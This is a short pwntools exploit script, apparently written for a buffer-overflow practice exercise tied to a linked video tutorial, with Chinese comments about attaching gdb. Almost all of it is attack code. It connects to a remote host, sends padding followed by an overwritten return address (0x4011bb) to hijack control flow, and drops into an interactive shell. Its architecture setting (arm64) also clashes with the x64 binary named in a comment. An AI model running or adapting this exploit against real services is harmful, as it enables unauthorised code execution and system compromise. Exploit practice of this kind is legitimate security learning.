'''
Author: Jack Jparrow
Date: 2022-08-18 17:56:26
LastEditTime: 2022-11-15 15:32:29
LastEditors: 白银
Description: gcc -no-pie https://www.bilibili.com/video/BV1mr4y1Y7fW?p=12&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=2299.0
'''
from pwn import *

context(log_level = 'debug', arch = 'arm64', os = 'linux')
# context(log_level = 'debug', arch = 'amd64', os = 'linux')#附加gdb用
# io = process('./question_3_x64')
io = remote("192.168.61.134", 8888)
# io.recvuntil('input:\n')
# io.send('a' * 9)

payload = b'a' * 4 + p64(0x4011bb)
# 下两行为附加gdb用，配合上面的
# gdb.attach(io)
# pause()

dem = b'input:\n'
io.sendafter(dem, payload)
# 附加gdb用，配合上面的
# io.sendlineafter(dem, payload)
io.interactive()#交互shell